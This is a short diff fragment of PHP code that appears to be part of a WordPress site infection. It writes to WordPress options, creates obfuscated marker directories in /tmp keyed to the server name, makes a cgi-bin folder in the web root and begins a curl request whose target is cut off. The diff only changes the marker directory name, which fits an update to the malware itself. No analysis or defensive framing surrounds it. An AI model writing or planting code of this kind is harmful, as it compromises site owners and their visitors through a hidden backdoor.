@@ -27,8 +27,8 @@ if (file_put_contents ($wpoptionsssss, $wpoptionssssr));   die(); }
 
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
-if(file_exists('/tmp/vv4v444t'.$d.$random)) { } else {
-	mkdir('/tmp/vv4v444t'.$d.$random);
+if(file_exists('/tmp/4v4v4gg'.$d.$random)) { } else {
+	mkdir('/tmp/4v4v4gg'.$d.$random);
 	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 $curl3 = curl_init();
  curl_setopt_array($curl3, [
